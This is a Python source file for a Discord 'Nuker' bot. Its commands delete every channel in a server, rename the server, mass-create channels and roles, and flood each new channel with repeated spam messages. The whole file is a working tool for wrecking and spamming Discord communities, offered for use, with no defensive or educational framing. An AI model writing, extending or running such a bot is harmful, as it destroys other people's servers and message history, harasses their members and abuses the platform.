import discord
import time
import os
import json
from colorama import init, Fore
from discord.ext import commands

init(autoreset=True)  # Initialize Colorama for automatic reset of color codes


# Define main classes
def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


# Defining main variables
global thing
thing = "False"


def load_config():
    with open("config.json") as f:
        config = json.load(f)
        return config.get("PREFIX"), config.get("TOKEN")


prefix, token = load_config()

# Set the bot's intents and token as well as removing the built-in help command
bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
bot.remove_command("help")


# Checking when the bot is ready
@bot.event
async def on_ready():
    clear()
    os.system(f"title Nuker - {bot.user.name}")
    print(f"{Fore.GREEN}[+]{Fore.RESET} Logged in as {bot.user.name}\n")


# Commands
@bot.command()
async def delete_channels(ctx):
    await ctx.message.delete()
    print("______________________________\n")
    print(f"\n{Fore.CYAN}[INFO]{Fore.RESET} Started removing channels\n")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{Fore.GREEN}[+]{Fore.RESET} Deleted channel: {channel}")
        except Exception as e:
            print(f"{Fore.RED}[-]{Fore.RESET} Failed to delete channel: {channel}")
    guild = ctx.message.guild
    await guild.create_text_channel('general')
    print("")
    print(f"{Fore.CYAN}[INFO]{Fore.RESET} Finished removing channels\n")


@bot.command()
async def setup_bot(ctx):
    await ctx.message.delete()
    print("______________________________\n")
    global message
    global amount_of_nuker_messages_per_channel
    chan = input(f"{Fore.YELLOW}[!]{Fore.RESET} Channel name: ")
    make_roles = input(f"{Fore.YELLOW}[!]{Fore.RESET} Make roles? [y/n]: ")
    if make_roles.lower() == "y":
        rolename = input(f"{Fore.YELLOW}[!]{Fore.RESET} Role name: ")
    guildname = input(f"{Fore.YELLOW}[!]{Fore.RESET} Guild name: ")
    message = input(f"{Fore.YELLOW}[!]{Fore.RESET} Message: ")
    amount_of_channels = int(input(f"{Fore.YELLOW}[!]{Fore.RESET} Amount of channels/roles: "))
    amount_of_nuker_messages_per_channel = int(input(f"{Fore.YELLOW}[!]{Fore.RESET} Amount of messages per channel: "))
    delete_channels = input(f"{Fore.YELLOW}[!]{Fore.RESET} Delete channels? [y/n]: ")
    global thing
    thing = "True"
    await ctx.guild.edit(name=guildname)

    if delete_channels.lower() == "y":
        try:
            for channel in ctx.guild.channels:
                await channel.delete()
        except Exception as e:
            print(f"{Fore.RED}[-]{Fore.RESET} An error occurred when deleting channels | {e}")
            pass

    for i in range(amount_of_channels):
        await ctx.guild.create_text_channel(chan)
        print(f"{Fore.GREEN}[+]{Fore.RESET} Created channel | {chan} | {i + 1}")
        if make_roles == "y":
            await ctx.guild.create_role(name=rolename)
            print(f"{Fore.GREEN}[+]{Fore.RESET} Created role | {rolename}")


@bot.event
async def on_guild_channel_create(channel):
    global thing
    if thing == "True":
        for i in range(amount_of_nuker_messages_per_channel):
            try:
                t = time.localtime()
                # currenttime = time.strftime("%H:%M", t)
                count = i + 1
                print(f"{Fore.GREEN}[+]{Fore.RESET} Message sent {channel.id}")
                await channel.send(message)
            except Exception as e:
                print(f"{Fore.RED}[-]{Fore.RESET} An error occurred | {e}")
        thing = "False"
    else:
        pass


bot.run(token)
